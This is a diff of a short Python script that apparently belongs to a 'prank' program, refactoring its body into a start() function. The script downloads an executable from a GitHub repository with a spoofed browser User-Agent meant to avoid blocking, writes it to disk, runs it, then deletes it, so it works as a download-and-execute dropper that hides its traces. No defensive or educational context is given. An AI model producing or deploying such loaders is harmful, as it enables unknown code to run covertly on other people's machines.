@@ -14,18 +14,21 @@ headers = {
     "User-Agent": "Mozilla/5.0"  # Helps avoid being blocked
 }
 
-url_content = requests.get(
-    "https://github.com/GummyC/PrankProgram/raw/refs/heads/main/Scripts/main_script.exe",
-    headers=headers,
-    )
+def start():
+    url_content = requests.get(
+        "https://github.com/GummyC/PrankProgram/raw/refs/heads/main/Scripts/main_script.exe",
+        headers=headers,
+        )
 
 
 
-with open(filename, "wb") as file_write:
-    file_write.write(url_content.content)
+    with open(filename, "wb") as file_write:
+        file_write.write(url_content.content)
 
-directory = os.path.abspath(filename)
-print(f"----> {directory}")
-subprocess.run([directory])
-os.remove(filename)
+    directory = os.path.abspath(filename)
+    print(f"----> {directory}")
+    subprocess.run([directory])
+    os.remove(filename)
 
+if __name__ == "__main__":
+    start()
